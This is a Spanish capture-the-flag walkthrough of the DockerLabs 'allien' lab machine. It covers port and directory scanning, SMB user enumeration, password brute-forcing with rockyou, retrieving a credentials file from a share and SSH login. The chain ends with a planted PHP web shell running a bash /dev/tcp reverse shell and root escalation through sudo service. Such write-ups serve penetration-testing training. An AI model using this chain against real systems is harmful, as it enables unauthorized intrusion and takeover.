nmap: 22,80,139,445

![image](https://github.com/user-attachments/assets/78d857c5-460d-42ce-94d6-3159515263ec)

---
hacemos un gobuster y nos da:

    gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,py,txt -t 64

![image](https://github.com/user-attachments/assets/b8a8ebeb-3b95-4134-a7fc-d1775b21470d)

    - info.php
    - productos.php

productos.php nos manda a otra pagina 

![image](https://github.com/user-attachments/assets/53410e19-348e-427a-94ea-322298cafe73)

en esa hay posibles contraseñas o usuarios como "shopo" o el codigo SHOPO20

haciendo un:
> enum4linux 172.17.0.2

nos da usuarios que tienen:

     - usuario1
     - usuario1
     - usuario3
     - satriani7
     - administrador

![image](https://github.com/user-attachments/assets/b54865f2-aa71-4d41-b4f6-bb8620adca3b)

hacemos una fuerza bruta: 

    sudo netexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding 

da:
> santriani7/50cent

![[satriani.png]]

lo utilizamos para ver que ficheros tiene:

    smbmap -u 'satriani7' -p '50cent' -H 172.17.0.2

da:

    - myshare
    - backup24

![[dockerlabs/facil/allien/back.png]]

nos conectamos ahora al "smb" 

    smbclient //172.17.0.2/backup24 -U 'satriani7%50cent'

dentro hay varios documentos
seguimos esta ruta: 
> Documentos > personal > get credentials.txt

![[document.png]]

en nuestra terminal lo leemos y tiene los usuarios y contraseñas

![[credencial.png]]

entramos por el ssh con la de administrador

     administrador/Adm1nP4ss2024

![[dockerlabs/facil/allien/conexion.png]]

hacemos el comando: find / -user administrador 2>/dev/null
y encontramos esto

![[var.png]]

Sabiendo esto, podemos intentar crear un archivo que nos permita pasar al usuario "www-data"

vamos a la siguiente dirección:
> cd /var/www/html

creamos primero una carpeta llamada: shell.sh

    - #!/bin/bash
    - bash -i >& /dev/tcp/172.17.0.1/443 0>&1

ahora creamos una carpeta con php

      - <?php
      - system('./shell.sh')
      - ?>

ahora vamos al navegador que esten utilizando, en este caso firefox y colocamos: 
    http://172.17.0.2/shell.php
en el terminal victima colocamos en escucha: nc -nlvp 443 

![[dockerlabs/facil/allien/conexion2.png]]

y estamos otra vez dentro

ahora un tratamiento stty

colocamos sudo -l
podemos escalar por "service". lo buscamos: https://gtfobins.github.io/gtfobins/service/#sudo

![[dockerlabs/facil/allien/sudo.png]]

lanzamos el comando que nos da: 

    sudo service ../../bin/sh

bash -p

![[dockerlabs/facil/allien/root.png]]

y somos root! 
